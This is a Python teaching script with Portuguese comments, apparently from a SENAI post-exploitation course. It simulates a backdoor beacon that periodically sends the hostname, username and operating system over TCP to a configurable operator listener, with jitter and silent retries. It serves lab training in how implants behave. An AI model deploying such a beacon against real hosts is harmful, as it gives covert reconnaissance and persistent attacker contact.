"""Agente de laboratório: simula um backdoor que faz contato periódico com o operador.

Baseado no script1.py da atividade de pós-exploração do SENAI. A cada ciclo
coleta host, usuário e sistema operacional, abre uma conexão TCP, envia uma
mensagem em texto claro e encerra a conexão.

Use apenas em ambiente próprio e controlado.

    python lab/agent.py                          # 127.0.0.1:9000 a cada 30 s
    python lab/agent.py --interval 10 --jitter 0.2
"""

import argparse
import getpass
import platform
import random
import socket
import time
from datetime import datetime


def main():
    p = argparse.ArgumentParser(description="Agente de laboratório (beacon periódico)")
    p.add_argument("--host", default="127.0.0.1", help="endereço do listener (padrão 127.0.0.1)")
    p.add_argument("--port", type=int, default=9000, help="porta do listener (padrão 9000)")
    p.add_argument("--interval", type=float, default=30.0, help="segundos entre contatos (padrão 30)")
    p.add_argument("--jitter", type=float, default=0.0,
                   help="variação aleatória do intervalo, de 0 a 1 (0.2 = mais ou menos 20%%)")
    args = p.parse_args()

    print(f"agente -> {args.host}:{args.port} a cada {args.interval:.0f} s (jitter {args.jitter:.0%}). Ctrl+C para parar.")
    while True:
        message = (
            f"{datetime.now()} | Host={socket.gethostname()} | "
            f"Usuario={getpass.getuser()} | Sistema={platform.system()}"
        )
        try:
            with socket.create_connection((args.host, args.port), timeout=5) as s:
                s.sendall(message.encode())
            print(f"[{datetime.now():%H:%M:%S}] enviado ({len(message)} bytes)")
        except OSError:
            # como no script original: falhas são ignoradas e o agente tenta de novo
            print(f"[{datetime.now():%H:%M:%S}] listener fora do ar, tentando no próximo ciclo")

        spread = args.interval * args.jitter
        time.sleep(max(0.1, args.interval + random.uniform(-spread, spread)))


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass
